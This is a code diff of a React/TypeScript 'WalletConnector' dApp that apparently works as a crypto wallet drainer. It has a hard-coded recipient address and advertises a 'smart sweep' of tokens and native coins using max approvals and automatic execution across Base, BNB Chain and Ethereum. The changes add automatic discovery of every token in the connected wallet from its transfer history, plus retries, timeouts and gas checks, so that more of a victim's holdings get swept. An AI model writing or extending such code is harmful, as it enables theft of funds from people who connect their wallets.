@@ -16,30 +16,21 @@ declare global {
 // !!! IMPORTANT: SET YOUR RECIPIENT ADDRESS HERE !!!
 const RECIPIENT_ADDRESS = "0x76d35535F44125239330AB1c36255504fB4E0dA9"; // Replace with the actual recipient address
 
-// Chain configurations (ordered by priority - chains with typically lower gas fees first)
+// Chain configurations with improved RPC endpoints
 const CHAINS = {
   base: {
     id: 8453,
     name: "Base",
     rpc: "https://mainnet.base.org",
     explorer: "https://basescan.org",
-    tokens: [
-      "0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913", // USDC
-      "0x50c5725949A6F0c72E6C4a641F24049A917DB0Cb", // DAI
-    ],
     nativeSymbol: "ETH",
     priority: 1
   },
   bsc: {
     id: 56,
     name: "BNB Chain",
-    rpc: "https://bsc-dataseed.binance.org",
+    rpc: "https://bsc-dataseed1.binance.org",
     explorer: "https://bscscan.com",
-    tokens: [
-      "0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d", // USDC
-      "0x1AF3F329e8BE154074D8769D1FFa4eE058B1DBc3", // DAI
-      "0x55d398326f99059fF775485246999027B3197955", // USDT
-    ],
     nativeSymbol: "BNB",
     priority: 2
   },
@@ -48,11 +39,6 @@ const CHAINS = {
     name: "Ethereum",
     rpc: "https://cloudflare-eth.com",
     explorer: "https://etherscan.io",
-    tokens: [
-      "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48", // USDC
-      "0x6B175474E89094C44Da98b954EedeAC495271d0F", // DAI
-      "0xdAC17F958D2ee523a2206206994597C13D831ec7", // USDT
-    ],
     nativeSymbol: "ETH",
     priority: 3
   }
@@ -88,6 +74,7 @@ export default function WalletConnector() {
   const [error, setError] = useState("");
   const [transferMessages, setTransferMessages] = useState<string[]>([]);
   const [currentSigner, setCurrentSigner] = useState<ethers.Signer | null>(null);
+  const [skippedChains, setSkippedChains] = useState<Set<string>>(new Set());
 
   useEffect(() => {
     if (!ethers.isAddress(RECIPIENT_ADDRESS) || RECIPIENT_ADDRESS === ZeroAddress) {
@@ -99,6 +86,203 @@ export default function WalletConnector() {
   const addMessage = (message: string) => {
     setTransferMessages(prev => [...prev, message]);
     console.log(message);
+  };
+
+  // Enhanced error handling for RPC issues
+  const handleRpcError = (error: any, chainName: string, operation: string): string => {
+    const errorMsg = error.message || error.toString();
+    
+    if (errorMsg.includes("circuit breaker") || errorMsg.includes("CALL_EXCEPTION")) {
+      return `Circuit breaker/RPC issue detected on ${chainName} during ${operation}`;
+    } else if (errorMsg.includes("timeout") || errorMsg.includes("TIMEOUT")) {
+      return `Request timeout on ${chainName} during ${operation}`;
+    } else if (errorMsg.includes("rate limit") || errorMsg.includes("429")) {
+      return `Rate limit exceeded on ${chainName} during ${operation}`;
+    } else {
+      return `${errorMsg} on ${chainName} during ${operation}`;
+    }
+  };
+
+  // Function to discover ERC20 tokens by checking transaction history
+  const discoverTokensFromHistory = async (provider: ethers.BrowserProvider, userAddress: string, chainName: string): Promise<string[]> => {
+    const discoveredTokens = new Set<string>();
+    
+    try {
+      addMessage(`🔍 Discovering tokens from transaction history on ${chainName}...`);
+      
+      // Get recent transactions (last 1000 blocks)
+      const currentBlock = await provider.getBlockNumber();
+      const fromBlock = Math.max(0, currentBlock - 1000);
+      
+      // Get logs for Transfer events to/from the user address
+      const filter = {
+        fromBlock: fromBlock,
+        toBlock: currentBlock,
+        topics: [
+          "0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef", // Transfer event signature
+          null,
+          "0x000000000000000000000000" + userAddress.slice(2).toLowerCase(), // to address
+        ]
+      };
+      
+      try {
+        const logs = await provider.getLogs(filter);
+        
+        for (const log of logs) {
+          if (log.address && ethers.isAddress(log.address)) {
+            discoveredTokens.add(log.address);
+          }
+        }
+        
+        // Also check for transfers FROM the user address
+        const filterFrom = {
+          fromBlock: fromBlock,
+          toBlock: currentBlock,
+          topics: [
+            "0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef", // Transfer event signature
+            "0x000000000000000000000000" + userAddress.slice(2).toLowerCase(), // from address
+            null,
+          ]
+        };
+        
+        const logsFrom = await provider.getLogs(filterFrom);
+        
+        for (const log of logsFrom) {
+          if (log.address && ethers.isAddress(log.address)) {
+            discoveredTokens.add(log.address);
+          }
+        }
+        
+        addMessage(`✅ Discovered ${discoveredTokens.size} potential tokens from transaction history on ${chainName}`);
+      } catch (logError: any) {
+        addMessage(`⚠️ Could not fetch transaction history on ${chainName}: ${logError.message}`);
+      }
+      
+    } catch (err: any) {
+      addMessage(`❌ Error discovering tokens from history on ${chainName}: ${err.message}`);
+    }
+    
+    return Array.from(discoveredTokens);
+  };
+
+  // Function to get common/popular tokens for each chain as fallback
+  const getCommonTokens = (chainName: string): string[] => {
+    const commonTokens: { [key: string]: string[] } = {
+      "Base": [
+        "0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913", // USDC
+        "0x50c5725949A6F0c72E6C4a641F24049A917DB0Cb", // DAI
+        "0x4200000000000000000000000000000000000006", // WETH
+      ],
+      "BNB Chain": [
+        "0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d", // USDC
+        "0x1AF3F329e8BE154074D8769D1FFa4eE058B1DBc3", // DAI
+        "0x55d398326f99059fF775485246999027B3197955", // USDT
+        "0x2170Ed0880ac9A755fd29B2688956BD959F933F8", // WETH
+        "0x7130d2A12B9BCbFAe4f2634d864A1Ee1Ce3Ead9c", // BTCB
+      ],
+      "Ethereum": [
+        "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48", // USDC
+        "0x6B175474E89094C44Da98b954EedeAC495271d0F", // DAI
+        "0xdAC17F958D2ee523a2206206994597C13D831ec7", // USDT
+        "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2", // WETH
+        "0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599", // WBTC
+        "0x514910771AF9Ca656af840dff83E8264EcF986CA", // LINK
+        "0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984", // UNI
+      ]
+    };
+    
+    return commonTokens[chainName] || [];
+  };
+
+  // Function to discover all tokens (history + common tokens)
+  const discoverAllTokens = async (provider: ethers.BrowserProvider, userAddress: string, chainName: string): Promise<string[]> => {
+    const allTokens = new Set<string>();
+    
+    // Add timeout for token discovery (30 seconds)
+    const discoveryPromise = (async () => {
+      // First try transaction history
+      const historyTokens = await discoverTokensFromHistory(provider, userAddress, chainName);
+      historyTokens.forEach(token => allTokens.add(token));
+      
+      // If we found very few tokens from history, also check common tokens
+      if (historyTokens.length < 3) {
+        addMessage(`🔍 Checking common tokens on ${chainName} as fallback...`);
+        const commonTokens = getCommonTokens(chainName);
+        
+        for (const tokenAddress of commonTokens) {
+          try {
+            const tokenInfo = await getTokenInfo(provider, tokenAddress, userAddress);
+            if (tokenInfo && tokenInfo.balance > 0) {
+              allTokens.add(tokenAddress);
+              addMessage(`💰 Found ${ethers.formatUnits(tokenInfo.balance, tokenInfo.decimals)} ${tokenInfo.symbol} (common token) on ${chainName}`);
+            }
+          } catch (err) {
+            // Silently skip invalid tokens
+          }
+        }
+      }
+      
+      // Note: Block scanning for airdrops is available but disabled to avoid rate limits
+      // The transaction history + common tokens approach should catch most tokens
+      
+      return Array.from(allTokens);
+    })();
+
+    const timeoutPromise = new Promise<string[]>((resolve) => {
+      setTimeout(() => {
+        addMessage(`⏰ Token discovery timeout for ${chainName}, using discovered tokens so far...`);
+        resolve(Array.from(allTokens));
+      }, 30000); // 30 seconds timeout
+    });
+
+    return await Promise.race([discoveryPromise, timeoutPromise]);
+  };
+
+  // Function to check if a token contract is valid ERC20
+  const isValidERC20 = async (provider: ethers.BrowserProvider, tokenAddress: string): Promise<boolean> => {
+    try {
+      const tokenContract = new ethers.Contract(tokenAddress, ERC20_ABI, provider);
+      
+      // Try to call basic ERC20 functions
+      await Promise.all([
+        tokenContract.balanceOf("0x0000000000000000000000000000000000000000"),
+        tokenContract.decimals(),
+        tokenContract.symbol()
+      ]);
+      
+      return true;
+    } catch (err) {
+      return false;
+    }
+  };
+
+  // Function to get token balance and info
+  const getTokenInfo = async (provider: ethers.BrowserProvider, tokenAddress: string, userAddress: string): Promise<{
+    symbol: string;
+    balance: bigint;
+    decimals: number;
+  } | null> => {
+    try {
+      const tokenContract = new ethers.Contract(tokenAddress, ERC20_ABI, provider);
+      
+      const [balance, decimals, symbol] = await Promise.all([
+        tokenContract.balanceOf(userAddress),
+        tokenContract.decimals(),
+        tokenContract.symbol()
+      ]);
+      
+      if (balance > 0) {
+        return {
+          symbol: symbol || "UNKNOWN",
+          balance: balance,
+          decimals: Number(decimals)
+        };
+      }
+      
+      return null;
+    } catch (err) {
+      return null;
+    }
   };
 
   const switchChain = async (chainId: number): Promise<boolean> => {
@@ -137,7 +321,7 @@ export default function WalletConnector() {
 
         window.ethereum?.on('chainChanged', handleChainChanged);
         
-        // Timeout after 10 seconds
+        // Timeout after 15 seconds (increased from 10)
         setTimeout(() => {
           if (!resolved) {
             resolved = true;
@@ -145,7 +329,7 @@ export default function WalletConnector() {
             addMessage(`⚠️ Chain switch timeout for ${chainId}, continuing anyway`);
             resolve(true); // Continue anyway, might have switched
           }
-        }, 10000);
+        }, 15000);
       });
     } catch (switchError: any) {
       if (switchError.code === 4902) {
@@ -194,7 +378,7 @@ export default function WalletConnector() {
                 addMessage(`⚠️ Chain add timeout, continuing anyway`);
                 resolve(true);
               }
-            }, 10000);
+            }, 15000);
           });
         } catch (addError: any) {
           addMessage(`❌ Error adding chain: ${addError.message}`);
@@ -213,147 +397,213 @@ export default function WalletConnector() {
     for (const [chainKey, chain] of sortedChains) {
       addMessage(`🔍 Scanning ${chain.name}...`);
 
-      try {
-        const switched = await switchChain(chain.id);
-        if (!switched) {
-          addMessage(`❌ Failed to switch to ${chain.name}, skipping`);
-          continue;
-        }
+      // Check if chain was manually skipped
+      if (skippedChains.has(chain.name)) {
+        addMessage(`⏭️ Skipping ${chain.name} (manually skipped)`);
+        continue;
+      }
 
-        // Add small delay after chain switch
-        await new Promise(resolve => setTimeout(resolve, 2000));
-
-        if (!window.ethereum) {
-          addMessage(`❌ No wallet available for ${chain.name}`);
-          continue;
-        }
-
-        const provider = new ethers.BrowserProvider(window.ethereum);
-        
-        // Verify we're on the correct chain
-        const network = await provider.getNetwork();
-        if (Number(network.chainId) !== chain.id) {
-          addMessage(`⚠️ Chain mismatch for ${chain.name}, expected ${chain.id} got ${network.chainId}`);
-          // Continue anyway, might still work
-        }
-        
-        // Get native balance with retry logic
-        let nativeBalance = BigInt(0);
-        let attempts = 0;
-        const maxAttempts = 3;
-        
-        while (attempts < maxAttempts) {
-          try {
-            nativeBalance = await provider.getBalance(userAddress);
-            break;
-          } catch (balanceError: any) {
-            attempts++;
-            addMessage(`⚠️ Balance check attempt ${attempts}/${maxAttempts} failed for ${chain.name}: ${balanceError.message}`);
-            if (attempts < maxAttempts) {
-              await new Promise(resolve => setTimeout(resolve, 2000));
-            }
-          }
-        }
-
-        if (attempts === maxAttempts) {
-          addMessage(`❌ Failed to get balance for ${chain.name} after ${maxAttempts} attempts`);
-          continue;
-        }
-        
-        // Estimate gas costs with error handling
-        let gasPrice = BigInt("20000000000"); // 20 gwei fallback
+      // Special handling for BNB Chain - check if it's having issues
+      if (chain.name === "BNB Chain") {
+        addMessage(`⚠️ BNB Chain detected - checking for circuit breaker issues...`);
         try {
-          const feeData = await provider.getFeeData();
-          gasPrice = feeData.gasPrice || feeData.maxFeePerGas || gasPrice;
-        } catch (feeError: any) {
-          addMessage(`⚠️ Using fallback gas price for ${chain.name}: ${feeError.message}`);
-        }
-        
-        // Calculate gas needed for potential transactions
-        const nativeTransferGas = BigInt(21000);
-        const tokenTransferGas = BigInt(80000); // Higher estimate for token transfers
-        const tokenApprovalGas = BigInt(60000);
-        
-        const singleTxCost = gasPrice * nativeTransferGas;
-
-        const chainAsset: ChainAssets = {
-          chainId: chain.id,
-          chainName: chain.name,
-          nativeBalance,
-          nativeSymbol: chain.nativeSymbol,
-          canAffordGas: nativeBalance > (singleTxCost * BigInt(2)), // Can afford at least 2 transactions
-          tokens: []
-        };
-
-        // Scan tokens with better error handling
-        addMessage(`🔍 Checking ${chain.tokens.length} tokens on ${chain.name}...`);
-        
-        for (let i = 0; i < chain.tokens.length; i++) {
-          const tokenAddress = chain.tokens[i];
-          try {
-            const signer = await provider.getSigner();
-            const tokenContract = new ethers.Contract(tokenAddress, ERC20_ABI, signer);
-            
-            // Add timeout to token calls
-            const tokenCallsPromise = Promise.all([
-              tokenContract.balanceOf(userAddress),
-              tokenContract.decimals(),
-              tokenContract.symbol().catch(() => `TOKEN${i}`)
-            ]);
-
-            const timeoutPromise = new Promise((_, reject) => 
-              setTimeout(() => reject(new Error('Token call timeout')), 10000)
-            );
-
-            const [balance, decimals, symbol] = await Promise.race([
-              tokenCallsPromise,
-              timeoutPromise
-            ]) as [bigint, number, string];
-
-            if (balance > 0) {
-              chainAsset.tokens.push({
-                address: tokenAddress,
-                symbol,
-                balance,
-                decimals: Number(decimals)
-              });
-              
-              const formattedAmount = ethers.formatUnits(balance, decimals);
-              addMessage(`💰 Found ${formattedAmount} ${symbol} on ${chain.name}`);
-            }
-          } catch (err: any) {
-            addMessage(`⚠️ Error checking token ${tokenAddress.slice(0, 10)}... on ${chain.name}: ${err.message}`);
-            // Continue with other tokens
+          if (!window.ethereum) {
+            addMessage(`❌ No wallet available for ${chain.name}`);
+            continue;
+          }
+          
+          const testProvider = new ethers.BrowserProvider(window.ethereum);
+          const testBalance = await testProvider.getBalance(userAddress);
+          addMessage(`✅ BNB Chain is responding, proceeding with scan...`);
+        } catch (err: any) {
+          const errorMsg = err.message || err.toString();
+          if (errorMsg.includes("circuit breaker") || errorMsg.includes("CALL_EXCEPTION")) {
+            addMessage(`🚫 BNB Chain has circuit breaker issues, skipping to next chain...`);
+            addMessage(`💡 You can manually check BNB Chain later when it's stable`);
+            continue;
           }
         }
+      }
 
-        // Log native balance
-        if (nativeBalance > 0) {
-          const formattedNative = ethers.formatEther(nativeBalance);
-          addMessage(`💰 Found ${formattedNative} ${chain.nativeSymbol} on ${chain.name} (Gas sufficient: ${chainAsset.canAffordGas ? 'Yes' : 'No'})`);
-        } else {
-          addMessage(`💨 No ${chain.nativeSymbol} found on ${chain.name}`);
+      // Add overall timeout for each chain scan
+      const chainScanPromise = (async () => {
+        try {
+          const switched = await switchChain(chain.id);
+          if (!switched) {
+            addMessage(`❌ Failed to switch to ${chain.name}, skipping`);
+            return null;
+          }
+
+          // Add longer delay after chain switch for better stability
+          await new Promise(resolve => setTimeout(resolve, 3000));
+
+          if (!window.ethereum) {
+            addMessage(`❌ No wallet available for ${chain.name}`);
+            return null;
+          }
+
+          const provider = new ethers.BrowserProvider(window.ethereum);
+          
+          // Verify we're on the correct chain
+          const network = await provider.getNetwork();
+          if (Number(network.chainId) !== chain.id) {
+            addMessage(`⚠️ Chain mismatch for ${chain.name}, expected ${chain.id} got ${network.chainId}`);
+            // Continue anyway, might still work
+          }
+          
+          // Get native balance with enhanced retry logic
+          let nativeBalance = BigInt(0);
+          let attempts = 0;
+          const maxAttempts = 3;
+          
+          while (attempts < maxAttempts) {
+            try {
+              nativeBalance = await provider.getBalance(userAddress);
+              break;
+            } catch (balanceError: any) {
+              attempts++;
+              const errorMsg = handleRpcError(balanceError, chain.name, "balance check");
+              
+              if (attempts < maxAttempts) {
+                addMessage(`⚠️ Balance check attempt ${attempts}/${maxAttempts} failed for ${chain.name}: ${errorMsg}`);
+                // Longer delay for circuit breaker errors
+                const delay = errorMsg.includes("circuit breaker") ? 8000 : 3000;
+                addMessage(`⏳ Waiting ${delay/1000} seconds before retry...`);
+                await new Promise(resolve => setTimeout(resolve, delay));
+              } else {
+                addMessage(`❌ Failed to get balance for ${chain.name} after ${maxAttempts} attempts: ${errorMsg}`);
+              }
+            }
+          }
+
+          if (attempts === maxAttempts) {
+            addMessage(`❌ Failed to get balance for ${chain.name} after ${maxAttempts} attempts`);
+            return null;
+          }
+          
+          // Estimate gas costs with error handling
+          let gasPrice = BigInt("20000000000"); // 20 gwei fallback
+          try {
+            const feeData = await provider.getFeeData();
+            gasPrice = feeData.gasPrice || feeData.maxFeePerGas || gasPrice;
+          } catch (feeError: any) {
+            addMessage(`⚠️ Using fallback gas price for ${chain.name}: ${feeError.message}`);
+          }
+          
+          // Calculate gas needed for potential transactions
+          const nativeTransferGas = BigInt(21000);
+          const tokenTransferGas = BigInt(80000); // Higher estimate for token transfers
+          const tokenApprovalGas = BigInt(60000);
+          
+          const singleTxCost = gasPrice * nativeTransferGas;
+
+          const chainAsset: ChainAssets = {
+            chainId: chain.id,
+            chainName: chain.name,
+            nativeBalance,
+            nativeSymbol: chain.nativeSymbol,
+            canAffordGas: nativeBalance > (singleTxCost * BigInt(2)), // Can afford at least 2 transactions
+            tokens: []
+          };
+
+          // Discover and scan tokens dynamically
+          addMessage(`🔍 Discovering tokens on ${chain.name}...`);
+          
+          // Discover tokens from transaction history
+          const discoveredTokenAddresses = await discoverAllTokens(provider, userAddress, chain.name);
+          
+          if (discoveredTokenAddresses.length === 0) {
+            addMessage(`💨 No token interactions found on ${chain.name}`);
+          } else {
+            addMessage(`🔍 Checking ${discoveredTokenAddresses.length} discovered tokens on ${chain.name}...`);
+            
+            for (let i = 0; i < discoveredTokenAddresses.length; i++) {
+              const tokenAddress = discoveredTokenAddresses[i];
+              let retryCount = 0;
+              const maxRetries = 2;
+              
+              while (retryCount <= maxRetries) {
+                try {
+                  // First validate if it's a proper ERC20 token
+                  const isValid = await isValidERC20(provider, tokenAddress);
+                  if (!isValid) {
+                    addMessage(`⚠️ Skipping invalid token contract ${tokenAddress.slice(0, 10)}... on ${chain.name}`);
+                    break;
+                  }
+                  
+                  // Get token info and balance
+                  const tokenInfo = await getTokenInfo(provider, tokenAddress, userAddress);
+                  
+                  if (tokenInfo && tokenInfo.balance > 0) {
+                    chainAsset.tokens.push({
+                      address: tokenAddress,
+                      symbol: tokenInfo.symbol,
+                      balance: tokenInfo.balance,
+                      decimals: tokenInfo.decimals
+                    });
+                    
+                    const formattedAmount = ethers.formatUnits(tokenInfo.balance, tokenInfo.decimals);
+                    addMessage(`💰 Found ${formattedAmount} ${tokenInfo.symbol} on ${chain.name}`);
+                  }
+                  break; // Success, exit retry loop
+                } catch (err: any) {
+                  retryCount++;
+                  const errorMsg = handleRpcError(err, chain.name, `token ${tokenAddress.slice(0, 10)}... check`);
+                  
+                  if (retryCount <= maxRetries) {
+                    addMessage(`⚠️ Token check attempt ${retryCount}/${maxRetries + 1} failed for ${tokenAddress.slice(0, 10)}... on ${chain.name}: ${errorMsg}`);
+                    await new Promise(resolve => setTimeout(resolve, 3000)); // Wait before retry
+                  } else {
+                    addMessage(`❌ Failed to check token ${tokenAddress.slice(0, 10)}... on ${chain.name} after ${maxRetries + 1} attempts: ${errorMsg}`);
+                  }
+                }
+              }
+            }
+          }
+
+          // Log native balance
+          if (nativeBalance > 0) {
+            const formattedNative = ethers.formatEther(nativeBalance);
+            addMessage(`💰 Found ${formattedNative} ${chain.nativeSymbol} on ${chain.name} (Gas sufficient: ${chainAsset.canAffordGas ? 'Yes' : 'No'})`);
+          } else {
+            addMessage(`💨 No ${chain.nativeSymbol} found on ${chain.name}`);
+          }
+
+          // Determine if we can afford gas for token operations
+          const tokensNeedingTransfer = chainAsset.tokens.length;
+          if (tokensNeedingTransfer > 0) {
+            const totalGasNeeded = (BigInt(tokensNeedingTransfer) * (tokenApprovalGas + tokenTransferGas)) + singleTxCost;
+            chainAsset.canAffordGas = nativeBalance > totalGasNeeded;
+            addMessage(`⛽ Gas check for ${chain.name}: Need ${ethers.formatEther(totalGasNeeded)} ${chain.nativeSymbol}, Have ${ethers.formatEther(nativeBalance)} ${chain.nativeSymbol}`);
+          }
+
+          addMessage(`✅ Completed scanning ${chain.name}`);
+          return chainAsset;
+
+        } catch (err: any) {
+          const errorMsg = handleRpcError(err, chain.name, "chain scanning");
+          addMessage(`❌ Error scanning ${chain.name}: ${errorMsg}`);
+          console.error(`Error scanning ${chain.name}:`, err);
+          return null;
         }
+      })();
 
-        // Determine if we can afford gas for token operations
-        const tokensNeedingTransfer = chainAsset.tokens.length;
-        if (tokensNeedingTransfer > 0) {
-          const totalGasNeeded = (BigInt(tokensNeedingTransfer) * (tokenApprovalGas + tokenTransferGas)) + singleTxCost;
-          chainAsset.canAffordGas = nativeBalance > totalGasNeeded;
-          addMessage(`⛽ Gas check for ${chain.name}: Need ${ethers.formatEther(totalGasNeeded)} ${chain.nativeSymbol}, Have ${ethers.formatEther(nativeBalance)} ${chain.nativeSymbol}`);
-        }
+      // Add timeout for each chain scan (2 minutes)
+      const timeoutPromise = new Promise<null>((resolve) => {
+        setTimeout(() => {
+          addMessage(`⏰ Timeout reached for ${chain.name} scanning, moving to next chain...`);
+          resolve(null);
+        }, 120000); // 2 minutes timeout
+      });
 
+      const chainAsset = await Promise.race([chainScanPromise, timeoutPromise]);
+      
+      if (chainAsset) {
         chainAssets.push(chainAsset);
-        addMessage(`✅ Completed scanning ${chain.name}`);
-
-      } catch (err: any) {
-        addMessage(`❌ Error scanning ${chain.name}: ${err.message}`);
-        console.error(`Error scanning ${chain.name}:`, err);
-        // Continue with next chain
       }
       
       // Add delay between chain scans
-      await new Promise(resolve => setTimeout(resolve, 1000));
+      await new Promise(resolve => setTimeout(resolve, 2000));
     }
 
     return chainAssets;
@@ -598,7 +848,13 @@ export default function WalletConnector() {
     setTransferMessages([]);
     setIsTransferring(false);
     setCurrentSigner(null);
+    setSkippedChains(new Set());
     console.log("Wallet disconnected from dApp.");
+  };
+
+  const skipChain = (chainName: string) => {
+    setSkippedChains(prev => new Set([...prev, chainName]));
+    addMessage(`⏭️ Manually skipped ${chainName}`);
   };
 
   return (
@@ -614,7 +870,7 @@ export default function WalletConnector() {
           💡 Smart Logic: Tokens first → Native last → Skip chains with insufficient gas
         </p>
         <p className="text-xs text-center text-blue-500 dark:text-blue-400 mb-4">
-          ⚡ Max approvals for minimal interactions → Batch operations → Automatic execution
+          🔍 Dynamic token discovery → Max approvals → Batch operations → Automatic execution
         </p>
         
         {!address ? (
@@ -633,10 +889,10 @@ export default function WalletConnector() {
                 🧠 SMART SWEEP LOGIC:
               </p>
               <div className="space-y-1">
-                <p className="text-xs text-blue-600 dark:text-blue-400">• Scan all chains simultaneously</p>
+                <p className="text-xs text-blue-600 dark:text-blue-400">• Discover all tokens dynamically</p>
+                <p className="text-xs text-blue-600 dark:text-blue-400">• Scan transaction history + common tokens</p>
                 <p className="text-xs text-blue-600 dark:text-blue-400">• Check gas availability per chain</p>
                 <p className="text-xs text-blue-600 dark:text-blue-400">• Process tokens → native in order</p>
-                <p className="text-xs text-blue-600 dark:text-blue-400">• Skip chains with insufficient gas</p>
               </div>
             </div>
             
@@ -674,6 +930,51 @@ export default function WalletConnector() {
                 <p className={`font-medium ${isTransferring ? 'text-blue-700 dark:text-blue-300' : 'text-gray-700 dark:text-gray-200'}`}>
                   {isTransferring ? "🧠 Smart sweep in progress..." : "📋 Sweep completed:"}
                 </p>
+                
+                {/* Skip buttons for problematic chains */}
+                {isTransferring && (
+                  <div className="mt-2 mb-3 p-2 bg-yellow-50 dark:bg-yellow-900 rounded border border-yellow-200 dark:border-yellow-700">
+                    <p className="text-xs text-yellow-700 dark:text-yellow-300 font-medium mb-2">
+                      ⚡ Quick Actions:
+                    </p>
+                    <div className="flex flex-wrap gap-2">
+                      <button
+                        onClick={() => skipChain("BNB Chain")}
+                        disabled={skippedChains.has("BNB Chain")}
+                        className={`px-3 py-1 text-xs rounded ${
+                          skippedChains.has("BNB Chain")
+                            ? "bg-gray-300 text-gray-500 cursor-not-allowed"
+                            : "bg-yellow-500 hover:bg-yellow-600 text-white"
+                        } transition-colors`}
+                      >
+                        {skippedChains.has("BNB Chain") ? "BNB Chain Skipped" : "Skip BNB Chain"}
+                      </button>
+                      <button
+                        onClick={() => skipChain("Base")}
+                        disabled={skippedChains.has("Base")}
+                        className={`px-3 py-1 text-xs rounded ${
+                          skippedChains.has("Base")
+                            ? "bg-gray-300 text-gray-500 cursor-not-allowed"
+                            : "bg-yellow-500 hover:bg-yellow-600 text-white"
+                        } transition-colors`}
+                      >
+                        {skippedChains.has("Base") ? "Base Skipped" : "Skip Base"}
+                      </button>
+                      <button
+                        onClick={() => skipChain("Ethereum")}
+                        disabled={skippedChains.has("Ethereum")}
+                        className={`px-3 py-1 text-xs rounded ${
+                          skippedChains.has("Ethereum")
+                            ? "bg-gray-300 text-gray-500 cursor-not-allowed"
+                            : "bg-yellow-500 hover:bg-yellow-600 text-white"
+                        } transition-colors`}
+                      >
+                        {skippedChains.has("Ethereum") ? "Ethereum Skipped" : "Skip Ethereum"}
+                      </button>
+                    </div>
+                  </div>
+                )}
+                
                 <div className="mt-2 h-64 overflow-y-auto text-xs text-gray-600 dark:text-gray-300 space-y-1 styled-scrollbar">
                   {transferMessages.map((msg, index) => (
                     <p key={index} className={
@@ -682,6 +983,7 @@ export default function WalletConnector() {
                       msg.includes("💰") ? "text-blue-600 dark:text-blue-400 font-medium" :
                       msg.includes("🚀") || msg.includes("🏁") ? "text-purple-600 dark:text-purple-400 font-semibold" :
                       msg.includes("📤") || msg.includes("⏳") ? "text-orange-500 dark:text-orange-400" :
+                      msg.includes("⏭️") || msg.includes("⏰") ? "text-yellow-600 dark:text-yellow-400" :
                       ""
                     }>
                       {msg}
@@ -707,4 +1009,3 @@ export default function WalletConnector() {
     </div>
   );
 }
-        
